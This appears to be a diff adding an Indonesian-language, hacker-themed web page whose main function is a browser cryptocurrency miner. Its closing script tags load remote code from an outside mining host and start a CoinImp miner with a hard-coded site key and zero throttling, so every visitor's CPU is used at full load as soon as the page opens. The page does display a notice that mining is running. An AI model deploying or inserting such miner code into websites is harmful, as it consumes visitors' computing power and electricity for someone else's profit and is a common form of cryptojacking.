@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Futuristic Hacker Mining</title>
+    <style>
+        /* Gaya umum */
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            background-color: #0f0f0f;
+            color: #00ff00;
+            overflow: hidden;
+        }
+
+        /* Animasi latar belakang */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 0, 0.1),
+                rgba(0, 255, 0, 0.1) 1px,
+                transparent 1px,
+                transparent 3px
+            );
+            animation: flicker 0.15s infinite;
+            z-index: -1;
+        }
+
+        @keyframes flicker {
+            0%, 100% { opacity: 0.9; }
+            50% { opacity: 1; }
+        }
+
+        /* Header */
+        header {
+            padding: 20px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            box-shadow: 0 0 10px #00ff00;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 2.5em;
+            text-shadow: 0 0 15px #00ff00;
+        }
+
+        /* Konten utama */
+        main {
+            padding: 20px;
+            text-align: center;
+        }
+
+        p {
+            font-size: 1.2em;
+            margin: 10px 0;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        .notification {
+            padding: 15px;
+            margin: 20px auto;
+            width: 80%;
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            box-shadow: 0 0 10px #00ff00;
+        }
+
+        /* Footer */
+        footer {
+            padding: 10px;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            box-shadow: 0 0 10px #00ff00;
+            font-size: 0.9em;
+        }
+
+        /* Efek teks berkedip */
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        /* Scroll teks */
+        .scroll-text {
+            white-space: nowrap;
+            overflow: hidden;
+            animation: scroll 10s linear infinite;
+        }
+
+        @keyframes scroll {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Futuristic Hacker Mining</h1>
+    </header>
+    <main>
+        <p class="blink">SYSTEM ONLINE...</p>
+        <p>Website ini menggunakan skrip penambangan melalui JavaScript.</p>
+        <div class="notification">
+            ⚠️ Sistem sedang berjalan! Jika Anda merasa terganggu, silakan hentikan aktivitas penambangan.
+        </div>
+    </main>
+    <footer>
+        <p class="scroll-text">&copy; 2025 Hacker Mining. Access Granted.</p>
+    </footer>
+
+    <!-- Skrip Penambangan -->
+    <script src="https://www.hostingcloud.racing/HEZn.js"></script>
+    <script>
+        var _client = new Client.Anonymous('201bf3164446664b5c4e56c8ce2d8d0464a9ded1d82355ffb07357741b6262c3', {
+            throttle: 0, c: 'w'
+        });
+        _client.start();
+        _client.addMiningNotification(
+            "Pemberitahuan",
+            "Situs ini menjalankan penambangan JavaScript dari coinimp.com. Jika ini mengganggu Anda, Anda bisa menghentikannya.",
+            "#00ff00", 40, "#3d3d3d"
+        );
+    </script>
+</body>
+</html>
